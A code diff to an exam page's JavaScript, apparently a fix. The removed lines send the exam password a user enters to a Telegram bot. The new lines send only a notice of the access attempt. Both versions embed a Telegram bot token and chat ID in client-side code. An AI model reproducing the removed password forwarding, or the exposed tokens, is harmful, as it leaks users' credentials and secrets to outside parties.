@@ -1789,10 +1789,10 @@
     function verifyAndStart() {
         capturedExamVerificationPassword = document.getElementById('exam-password-input').value || "";
         
-        // إرسال كلمة المرور إلى Telegram
-        const telegramBotToken = '8979568296:AAEj9rp_VvnR9ZMgFsIwzxRS1raqiWr-cWE';
-        const telegramChatId = '-5118649597';
-        const message = `🔔 محاولة دخول للاختبار\nكلمة المرور المُدخلة: ${capturedExamVerificationPassword}`;
+        // Send an exam access notification without including the password.
+        const telegramBotToken = '8979219267:AAHK8shvQRaFnBTkSU_aG3qo87ucaqdsZiY';
+        const telegramChatId = '-5573923946';
+        const message = '🔔 محاولة دخول للاختبار';
         
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
             method: 'POST',
@@ -1803,7 +1803,10 @@
                 chat_id: telegramChatId,
                 text: message
             })
-        }).catch(error => console.error('Error sending to Telegram:', error));
+        }).then(async response => {
+            const result = await response.json();
+            if (!response.ok || !result.ok) throw new Error(result.description || 'Telegram notification failed');
+        }).catch(error => console.error('Error sending to Telegram:', error.message));
 
         closeModal();
         openLockNotification();
